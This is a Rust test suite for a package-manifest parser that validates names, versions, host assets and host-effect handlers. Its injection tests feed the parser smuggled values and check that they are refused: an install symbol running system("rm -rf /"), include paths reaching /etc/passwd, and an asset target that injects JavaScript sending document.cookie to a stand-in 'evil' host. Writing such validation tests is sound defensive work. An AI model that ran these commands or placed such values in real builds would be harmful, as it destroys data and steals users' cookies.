        assert_eq!(pkg.package.version, "0.1.0");
        assert_eq!(pkg.package.license, "MIT OR Apache-2.0");
        assert_eq!(pkg.components.exports, vec!["Grid", "Cell", "Column"]);
        assert!(pkg.dependencies.is_empty());
        assert!(pkg.styles.token_palette.is_none());
        assert!(pkg.host_assets.files.is_empty());
        assert_eq!(pkg.kernel.version, "1");
    }

    #[test]
    fn missing_package_section_errors() {
        let src = r#"
[components]
exports = []
[kernel]
version = "1"
"#;
        let err = parse(src).unwrap_err();
        assert!(
            matches!(err, ManifestError::MissingField { ref section, .. } if section == "package"),
            "got {err:?}"
        );
    }

    #[test]
    fn missing_components_section_errors() {
        let src = r#"
[package]
name = "x"
version = "0.1.0"
description = "x"
license = "MIT"
[kernel]
version = "1"
"#;
        let err = parse(src).unwrap_err();
        assert!(
            matches!(err, ManifestError::MissingField { ref section, .. } if section == "components"),
            "got {err:?}"
        );
    }

    #[test]
    fn missing_kernel_section_errors() {
        let src = r#"
[package]
name = "x"
version = "0.1.0"
description = "x"
license = "MIT"
[components]
exports = []
"#;
        let err = parse(src).unwrap_err();
        assert!(
            matches!(err, ManifestError::MissingField { ref section, .. } if section == "kernel"),
            "got {err:?}"
        );
    }

    #[test]
    fn rejects_non_kebab_package_name() {
        // Underscores are not kebab-case.
        let src = r#"
[package]
name = "Mosaic_Grid"
version = "0.1.0"
description = "x"
license = "MIT"
[components]
exports = []
[kernel]
version = "1"
"#;
        let err = parse(src).unwrap_err();
        assert!(
            matches!(err, ManifestError::InvalidPackageName(_)),
            "got {err:?}"
        );
    }

    #[test]
    fn rejects_bad_semver() {
        let src = r#"
[package]
name = "x"
version = "1.0"
description = "x"
license = "MIT"
[components]
exports = []
[kernel]
version = "1"
"#;
        let err = parse(src).unwrap_err();
        assert!(
            matches!(err, ManifestError::InvalidSemverString(_)),
            "got {err:?}"
        );
    }

    #[test]
    fn rejects_non_pascal_component_name() {
        let src = r#"
[package]
name = "x"
version = "0.1.0"
description = "x"
license = "MIT"
[components]
exports = ["grid"]
[kernel]
version = "1"
"#;
        let err = parse(src).unwrap_err();
        assert!(
            matches!(err, ManifestError::InvalidComponentName(ref n) if n == "grid"),
            "got {err:?}"
        );
    }

    #[test]
    fn allows_empty_exports() {
        // A package can be metadata-only — see CHANGELOG note about
        // aggregator packages that re-export via dependencies.
        let src = r#"
[package]
name = "mosaic-pkg-meta"
version = "0.1.0"
description = "Metadata-only aggregator package"
license = "MIT"
[components]
exports = []
[kernel]
version = "1"
"#;
        let pkg = parse(src).expect("empty exports must be allowed");
        assert!(pkg.components.exports.is_empty());
    }

    #[test]
    fn parses_dependencies() {
        let src = r#"
[package]
name = "x"
version = "0.1.0"
description = "x"
license = "MIT"
[components]
exports = []
[dependencies]
mosaic-pkg-grid = "0.2.0"
mosaic-pkg-form = "1.0.0-rc.1"
[kernel]
version = "1"
"#;
        let pkg = parse(src).expect("manifest valid");
        assert_eq!(pkg.dependencies.len(), 2);
        assert_eq!(pkg.dependencies["mosaic-pkg-grid"], "0.2.0");
        assert_eq!(pkg.dependencies["mosaic-pkg-form"], "1.0.0-rc.1");
    }

    #[test]
    fn parses_optional_host_asset_files() {
        let src = r#"
[package]
name = "mosaic-pkg-form"
version = "0.1.0"
description = "Form package"
license = "MIT"
[components]
exports = ["Form"]
[dependencies]
[host_assets]
files = [
  { backend = "react", source = "host/web/form-host.ts", target = "src/form-host.ts" },
  { backend = "xaml", source = "host/xaml/MosaicHost.cs", target = "MosaicHost.cs" },
]
[kernel]
version = "1"
"#;
        let pkg = parse(src).expect("manifest valid");
        assert_eq!(pkg.host_assets.files.len(), 2);
        assert_eq!(pkg.host_assets.files[0].backend, "react");
        assert_eq!(pkg.host_assets.files[0].source, "host/web/form-host.ts");
        assert_eq!(pkg.host_assets.files[0].target, "src/form-host.ts");
        assert_eq!(pkg.host_assets.files[1].backend, "xaml");
    }

    #[test]
    fn parses_optional_package_token_palette() {
        let src = r#"
[package]
name = "mosaic-std-foundation"
version = "0.1.0"
description = "Foundation primitives"
license = "MIT"
[components]
exports = []
[dependencies]
[styles]
token_palette = "tokens/foundation.json"
[kernel]
version = "1"
"#;
        let pkg = parse(src).expect("manifest valid");
        assert_eq!(
            pkg.styles.token_palette.as_deref(),
            Some("tokens/foundation.json")
        );
    }

    #[test]
    fn rejects_unsafe_or_non_json_package_token_palette_paths() {
        for path in [
            "",
            "/tokens.json",
            "../tokens.json",
            "tokens/../secret.json",
            "tokens\\windows.json",
            "tokens/palette.toml",
        ] {
            let src = GOOD_MANIFEST.replace(
                "[kernel]",
                &format!("[styles]\ntoken_palette = {path:?}\n[kernel]"),
            );
            let err = parse(&src).unwrap_err();
            assert!(
                matches!(err, ManifestError::InvalidStylePath(ref value) if value == path),
                "for {path:?} got {err:?}"
            );
        }
    }

    #[test]
    fn rejects_unknown_style_fields() {
        let src = GOOD_MANIFEST.replace(
            "[kernel]",
            "[styles]\ntoken_pallete = \"tokens/theme.json\"\n[kernel]",
        );
        let err = parse(&src).unwrap_err();
        assert!(
            matches!(err, ManifestError::TomlSyntax(ref message) if message.contains("unknown field `token_pallete`")),
            "got {err:?}"
        );
    }

    #[test]
    fn host_asset_files_require_source_and_target() {
        let src = r#"
[package]
name = "mosaic-pkg-form"
version = "0.1.0"
description = "Form package"
license = "MIT"
[components]
exports = ["Form"]
[dependencies]
[host_assets]
files = [
  { backend = "react", source = "host/web/form-host.ts" },
]
[kernel]
version = "1"
"#;
        let err = parse(src).unwrap_err();
        assert!(
            matches!(err, ManifestError::MissingField { ref section, ref field } if section == "host_assets.files" && field == "target"),
            "got {err:?}"
        );
    }

    #[test]
    fn rejects_bad_dependency_name() {
        let src = r#"
[package]
name = "x"
version = "0.1.0"
description = "x"
license = "MIT"
[components]
exports = []
[dependencies]
NotKebab = "0.1.0"
[kernel]
version = "1"
"#;
        let err = parse(src).unwrap_err();
        assert!(
            matches!(err, ManifestError::InvalidPackageName(_)),
            "got {err:?}"
        );
    }

    #[test]
    fn rejects_bad_dependency_version() {
        let src = r#"
[package]
name = "x"
version = "0.1.0"
description = "x"
license = "MIT"
[components]
exports = []
[dependencies]
mosaic-pkg-grid = "not-a-version"
[kernel]
version = "1"
"#;
        let err = parse(src).unwrap_err();
        assert!(
            matches!(err, ManifestError::InvalidSemverString(_)),
            "got {err:?}"
        );
    }

    #[test]
    fn rejects_kernel_version_other_than_1() {
        for bad in ["0", "2", "1.0", ""] {
            let src = format!(
                r#"
[package]
name = "x"
version = "0.1.0"
description = "x"
license = "MIT"
[components]
exports = []
[kernel]
version = "{bad}"
"#
            );
            let err = parse(&src).unwrap_err();
            assert!(
                matches!(err, ManifestError::InvalidKernelVersion(_)),
                "for {bad:?} got {err:?}"
            );
        }
    }

    #[test]
    fn reports_toml_syntax_error() {
        // Unterminated string — TOML will refuse to even tokenize this.
        let src = "[package\nname = ";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ManifestError::TomlSyntax(_)), "got {err:?}");
    }

    #[test]
    fn parse_path_reads_from_filesystem() {
        // Write to a temp file inside the OS temp dir.  We pick a name that
        // includes the process ID so parallel test runs don't collide.
        let mut tmp = std::env::temp_dir();
        tmp.push(format!(
            "mosaic-package-manifest-test-{}.toml",
            std::process::id()
        ));
        fs::write(&tmp, GOOD_MANIFEST).expect("write tmp manifest");

        let pkg = parse_path(&tmp).expect("parse_path must succeed");
        assert_eq!(pkg.package.name, "mosaic-pkg-grid");

        // Clean up so we don't litter /tmp.
        let _ = fs::remove_file(&tmp);
    }

    #[test]
    fn parse_path_reports_io_error() {
        // Path that almost certainly doesn't exist.
        let nope = Path::new("/this/path/should/not/exist/manifest.toml");
        let err = parse_path(nope).unwrap_err();
        assert!(matches!(err, ManifestError::TomlSyntax(_)));
    }

    #[test]
    fn host_assets_may_declare_dependencies_their_files_need() {
        // `[host_assets]` lets a package replace a generated host file. Until
        // this existed it gave no way to say what the replacement NEEDS, so a
        // host file importing anything outside the emitter's own set produced a
        // project that could not compile -- fixable only by patching the
        // generated build file out of band.
        let toml = r#"
[package]
name = "demo"
version = "0.1.0"
description = "demo package"
license = "MIT"

[components]
exports = ["Demo"]

[host_assets]
files = [
  { backend = "compose", source = "host/MosaicHost.kt", target = "src/main/kotlin/MosaicHost.kt" },
]
dependencies = [
  { backend = "compose", coordinate = "org.json:json:20260522" },
  { backend = "electron", coordinate = "some-npm-package@^1.2.3" },
]

[kernel]
version = "1"
"#;
        let manifest = parse(toml).expect("manifest should parse");
        assert_eq!(manifest.host_assets.dependencies.len(), 2);
        assert_eq!(manifest.host_assets.dependencies[0].backend, "compose");
        assert_eq!(
            manifest.host_assets.dependencies[0].coordinate,
            "org.json:json:20260522"
        );
        // The coordinate is passed through verbatim in whatever form the
        // backend's package manager expects -- a Maven coordinate here, an npm
        // range there. The manifest deliberately does not model every
        // ecosystem's version syntax.
        assert_eq!(
            manifest.host_assets.dependencies[1].coordinate,
            "some-npm-package@^1.2.3"
        );
    }

    #[test]
    fn host_asset_dependencies_are_optional() {
        // Every existing manifest omits them, and must keep parsing.
        let toml = r#"
[package]
name = "demo"
version = "0.1.0"
description = "demo package"
license = "MIT"

[components]
exports = ["Demo"]

[host_assets]
files = [
  { backend = "qt", source = "host/MosaicHost.cpp", target = "MosaicHost.cpp" },
]

[kernel]
version = "1"
"#;
        let manifest = parse(toml).expect("manifest should parse");
        assert!(manifest.host_assets.dependencies.is_empty());
        assert_eq!(manifest.host_assets.files.len(), 1);
    }

    #[test]
    fn a_dependency_missing_its_backend_or_coordinate_is_rejected() {
        // Both halves are load-bearing: a coordinate with no backend would be
        // silently dropped by every emitter, and a backend with no coordinate
        // would emit an empty dependency line into a build file.
        for body in [
            r#"dependencies = [ { coordinate = "org.json:json:1" } ]"#,
            r#"dependencies = [ { backend = "compose" } ]"#,
            r#"dependencies = [ { backend = "", coordinate = "org.json:json:1" } ]"#,
        ] {
            let toml = format!(
                r#"
[package]
name = "demo"
version = "0.1.0"
description = "demo package"
license = "MIT"

[components]
exports = ["Demo"]

[host_assets]
{body}

[kernel]
version = "1"
"#
            );
            assert!(parse(&toml).is_err(), "expected rejection for: {body}");
        }
    }
}

#[cfg(test)]
mod host_effects_tests {
    use super::*;

    fn manifest_with(host_effects: &str) -> String {
        format!(
            r#"
[package]
name = "mosaic-pkg-probe"
version = "0.1.0"
description = "probe"
license = "MIT"

[components]
exports = ["Probe"]

[dependencies]

{host_effects}

[kernel]
version = "1"
"#
        )
    }

    #[test]
    fn absent_section_is_empty_rather_than_an_error() {
        // Every package that does not need a host capability must keep parsing
        // exactly as it did before this section existed.
        let pkg = parse(&manifest_with("")).expect("a manifest without the section must parse");
        assert!(pkg.host_effects.files.is_empty());
        assert!(pkg.host_effects.handlers.is_empty());
    }

    #[test]
    fn a_declared_handler_and_its_files_round_trip() {
        let pkg = parse(&manifest_with(
            r#"
[host_effects]
files = [
  { backend = "qt", source = "host/qt/effects.h", target = "effects.h" },
  { backend = "qt", source = "host/qt/effects.cpp", target = "effects.cpp" },
]
handlers = [
  { backend = "qt", include = "effects.h", install = "installProbeEffects" },
]
"#,
        ))
        .expect("a well-formed section must parse");
        assert_eq!(pkg.host_effects.files.len(), 2);
        assert_eq!(pkg.host_effects.files[0].backend, "qt");
        assert_eq!(pkg.host_effects.files[0].source, "host/qt/effects.h");
        assert_eq!(pkg.host_effects.files[0].target, "effects.h");
        assert_eq!(pkg.host_effects.handlers.len(), 1);
        assert_eq!(pkg.host_effects.handlers[0].install, "installProbeEffects");
        assert_eq!(
            pkg.host_effects.handlers[0].include.as_deref(),
            Some("effects.h")
        );
    }

    #[test]
    fn include_is_optional_because_not_every_backend_needs_one() {
        // Swift's handler is in the same module and Kotlin's may be in the same
        // package, so requiring an include would force those backends to invent
        // a meaningless value.
        let pkg = parse(&manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "swiftui", install = "installProbeEffects" },
]
"#,
        ))
        .expect("a handler without an include must parse");
        assert!(pkg.host_effects.handlers[0].include.is_none());
    }

    #[test]
    fn two_handlers_for_one_backend_are_refused() {
        // Last-wins would install both and let the second overwrite the first's
        // registration, so the first's effects would go unanswered -- which is
        // the failure this whole mechanism exists to prevent.
        let err = parse(&manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "qt", install = "installA" },
  { backend = "qt", install = "installB" },
]
"#,
        ))
        .expect_err("two handlers for one backend must be refused");
        assert!(
            matches!(err, ManifestError::DuplicateHostEffectHandler { ref backend } if backend == "qt"),
            "unexpected error: {err}"
        );
        // And it names the backend, because a manifest may declare five.
        assert!(err.to_string().contains("qt"), "{err}");
    }

    #[test]
    fn two_handlers_for_different_backends_are_fine() {
        // The guard above must bound the backend, not the section: a package
        // wiring all five backends is the ordinary case.
        let pkg = parse(&manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "qt", install = "installA" },
  { backend = "swiftui", install = "installB" },
]
"#,
        ))
        .expect("one handler each for two backends must parse");
        assert_eq!(pkg.host_effects.handlers.len(), 2);
    }

    #[test]
    fn a_file_whose_backend_declares_no_handler_is_refused() {
        // The emitter would copy it into the project and add it to the build,
        // and nothing would ever call into it.
        let err = parse(&manifest_with(
            r#"
[host_effects]
files = [
  { backend = "compose", source = "host/compose/Effects.kt", target = "Effects.kt" },
]
handlers = [
  { backend = "qt", install = "installA" },
]
"#,
        ))
        .expect_err("a file with no handler for its backend must be refused");
        assert!(
            matches!(
                err,
                ManifestError::HostEffectFileWithoutHandler { ref backend, ref source }
                    if backend == "compose" && source == "host/compose/Effects.kt"
            ),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn an_empty_include_is_refused_rather_than_read_as_absent() {
        // Absent means "no include needed". An empty string reads the same way
        // but is almost certainly a typo, so accepting it would make a mistake
        // indistinguishable from a decision.
        let err = parse(&manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "qt", include = "", install = "installA" },
]
"#,
        ))
        .expect_err("an empty include must be refused");
        assert!(
            matches!(
                err,
                ManifestError::MissingField { ref section, ref field }
                    if section == "host_effects.handlers" && field == "include"
            ),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn a_handler_missing_its_install_symbol_is_refused() {
        let err = parse(&manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "qt", include = "effects.h" },
]
"#,
        ))
        .expect_err("a handler with no install symbol must be refused");
        assert!(
            matches!(
                err,
                ManifestError::MissingField { ref section, ref field }
                    if section == "host_effects.handlers" && field == "install"
            ),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn an_unknown_key_is_refused_rather_than_ignored() {
        // `deny_unknown_fields`, so a misspelled `instal` fails loudly instead
        // of emitting a project with no handler wired and no complaint.
        let err = parse(&manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "qt", instal = "installA" },
]
"#,
        ))
        .expect_err("an unknown key must be refused");
        assert!(
            matches!(err, ManifestError::TomlSyntax(_)),
            "unexpected error: {err}"
        );
    }
}

#[cfg(test)]
mod host_effects_injection_tests {
    use super::*;

    fn manifest_with(host_effects: &str) -> String {
        format!(
            r#"
[package]
name = "mosaic-pkg-probe"
version = "0.1.0"
description = "probe"
license = "MIT"

[components]
exports = ["Probe"]

[dependencies]

{host_effects}

[kernel]
version = "1"
"#
        )
    }

    #[test]
    fn an_install_symbol_carrying_a_statement_is_refused() {
        // The value is interpolated verbatim as a call expression, so without a
        // shape this is an arbitrary statement in someone's `main.cpp`.
        let err = parse(&manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "qt", install = "system(\"rm -rf /\"); dummy" },
]
"#,
        ))
        .expect_err("an install symbol containing a statement must be refused");
        assert!(
            matches!(err, ManifestError::InvalidHostEffectSymbol(_)),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn an_include_breaking_out_of_its_quotes_is_refused() {
        // Lands inside `#include "..."`, so a quote and a newline rewrite the
        // whole translation unit -- generated host code included.
        let err = parse(&manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "qt", include = "e.h\"\n#define private public\n#include \"y.h", install = "installA" },
]
"#,
        ))
        .expect_err("an include with a quote and newline must be refused");
        assert!(
            matches!(err, ManifestError::InvalidHostEffectInclude(_)),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn an_include_climbing_out_of_the_project_is_refused() {
        let err = parse(&manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "qt", include = "../../etc/passwd", install = "installA" },
]
"#,
        ))
        .expect_err("a `..` include must be refused");
        assert!(
            matches!(err, ManifestError::InvalidHostEffectInclude(_)),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn the_shapes_every_backend_actually_uses_are_accepted() {
        // The guards above must bound the damage without refusing the real
        // forms: a relative header, a qualified symbol, a dotted import, and
        // Dart's `package:` scheme.
        let pkg = parse(&manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "qt", include = "engram_effects.h", install = "installEngramEffects" },
  { backend = "compose", include = "com.example.Effects", install = "com.example.install" },
  { backend = "flutter", include = "package:engram/effects.dart", install = "installEffects" },
  { backend = "xaml", install = "Engram.Effects.Install" },
]
"#,
        ))
        .expect("every real backend form must be accepted");
        assert_eq!(pkg.host_effects.handlers.len(), 4);
    }

    #[test]
    fn a_wildcard_backend_is_refused_rather_than_matching_nothing() {
        // `[host_assets]` accepts `*` because copying one file everywhere is
        // meaningful. One handler everywhere is not -- what `install` receives
        // differs per backend -- so `*` here would match no backend at emission
        // and quietly install nothing.
        let err = parse(&manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "*", install = "installA" },
]
"#,
        ))
        .expect_err("a wildcard backend must be refused");
        assert!(
            matches!(err, ManifestError::HostEffectWildcardBackend { ref section } if section == "handlers"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn two_files_writing_one_target_are_refused() {
        // The later copy wins and the earlier file is silently not what gets
        // compiled -- the same last-wins hazard refused for handlers.
        let err = parse(&manifest_with(
            r#"
[host_effects]
files = [
  { backend = "qt", source = "host/qt/a.cpp", target = "effects.cpp" },
  { backend = "qt", source = "host/qt/b.cpp", target = "effects.cpp" },
]
handlers = [
  { backend = "qt", install = "installA" },
]
"#,
        ))
        .expect_err("two files writing one target must be refused");
        assert!(
            matches!(
                err,
                ManifestError::DuplicateHostEffectFile { ref backend, ref target }
                    if backend == "qt" && target == "effects.cpp"
            ),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn one_source_may_still_serve_two_backends() {
        // The duplicate guard keys on backend AND target, so sharing a file
        // across backends stays legal -- Engram already ships one `.mjs` to
        // both `html` and `webcomponent` through `[host_assets]`.
        let pkg = parse(&manifest_with(
            r#"
[host_effects]
files = [
  { backend = "qt", source = "host/shared.cpp", target = "effects.cpp" },
  { backend = "xaml", source = "host/shared.cpp", target = "effects.cpp" },
]
handlers = [
  { backend = "qt", install = "installA" },
  { backend = "xaml", install = "installB" },
]
"#,
        ))
        .expect("one source serving two backends must parse");
        assert_eq!(pkg.host_effects.files.len(), 2);
    }

    #[test]
    fn a_misspelled_section_key_is_refused_rather_than_silently_empty() {
        // Without `deny_unknown_fields` on the CONTAINER, `fils` parses as an
        // empty section: the package gets no handler wired, and nothing says so.
        // The inner structs carried the attribute; the container did not.
        let err = parse(&manifest_with(
            r#"
[host_effects]
fils = [
  { backend = "qt", source = "a.cpp", target = "a.cpp" },
]
handlers = [
  { backend = "qt", install = "installA" },
]
"#,
        ))
        .expect_err("a misspelled section key must be refused");
        assert!(
            matches!(err, ManifestError::TomlSyntax(_)),
            "unexpected error: {err}"
        );
    }
}

#[cfg(test)]
mod manifest_path_injection_tests {
    use super::*;

    fn manifest_with(section: &str) -> String {
        format!(
            r#"
[package]
name = "mosaic-pkg-probe"
version = "0.1.0"
description = "probe"
license = "MIT"

[components]
exports = ["Probe"]

[dependencies]

{section}

[kernel]
version = "1"
"#
        )
    }

    #[test]
    fn a_host_asset_target_carrying_javascript_is_refused() {
        // `activate_react_host_asset` prepends `import "./{target}";` to the
        // generated `main.tsx`. A quote and a semicolon are legal in a Unix
        // filename, so without a shape this is executable JavaScript on line 1
        // of the emitted app -- and under Electron, in a renderer.
        let source = manifest_with(
            r#"
[host_assets]
files = [
  { backend = "react", source = "host/web/x.ts", target = "src/x\";fetch(\"http://evil/\"+document.cookie);//.ts" },
]
"#,
        );
        let err = parse(&source).expect_err("a target carrying JavaScript must be refused");
        assert!(
            matches!(
                err,
                ManifestError::InvalidHostAssetPath { ref field, .. } if field == "target"
            ),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn every_host_asset_path_this_repo_actually_ships_still_parses() {
        // The tightening must not break the existing corpus. These are the real
        // shapes in the tree: nested paths, hyphens, dotted extensions, mixed
        // case. If a future package needs a leading dot or a `+`, this is the
        // test that should be revisited rather than the regex quietly widened.
        for path in [
            "MosaicHost.cpp",
            "Sources/App/MosaicHost.swift",
            "electron/host.js",
            "engram-host.mjs",
            "host/web/engram-mosaic-host-wasm.d.ts",
            "src/test/kotlin/VentureChromeInteractionTest.kt",
            "test/tst_venture_chrome.qml",
        ] {
            let source = manifest_with(&format!(
                r#"
[host_assets]
files = [
  {{ backend = "qt", source = "{path}", target = "{path}" }},
]
"#
            ));
            assert!(
                parse(&source).is_ok(),
                "a path this repo ships must still parse: {path}"
            );
        }
    }

    #[test]
    fn a_scheme_cannot_smuggle_a_dot_dot_past_the_check() {
        // Validating the whole string and then testing for a colon could not
        // see a `..` welded to the scheme: `package:../x` has no `..` SEGMENT,
        // so a `split('/')` check found nothing to object to.
        for include in ["package:../secret.h", "package:/etc/passwd", "package:a:b"] {
            let source = manifest_with(&format!(
                r#"
[host_effects]
handlers = [
  {{ backend = "flutter", include = "{include}", install = "installA" }},
]
"#
            ));
            let err = match parse(&source) {
                Ok(_) => panic!("`{include}` must be refused"),
                Err(err) => err,
            };
            assert!(
                matches!(err, ManifestError::InvalidHostEffectInclude(_)),
                "unexpected error for `{include}`: {err}"
            );
        }
    }

    #[test]
    fn an_absolute_windows_include_is_refused() {
        let source = manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "qt", include = "C:/Users/Public/backdoor.h", install = "installA" },
]
"#,
        );
        let err = parse(&source).expect_err("an absolute Windows include must be refused");
        assert!(
            matches!(err, ManifestError::InvalidHostEffectInclude(_)),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn the_legitimate_dart_package_form_still_parses() {
        // The narrowing must bound the scheme, not remove it: this is the one
        // include form that legitimately carries a colon.
        let source = manifest_with(
            r#"
[host_effects]
handlers = [
  { backend = "flutter", include = "package:engram/effects.dart", install = "installA" },
]
"#,
        );
        assert!(
            parse(&source).is_ok(),
            "Dart's package: form must still parse"
        );
    }
}
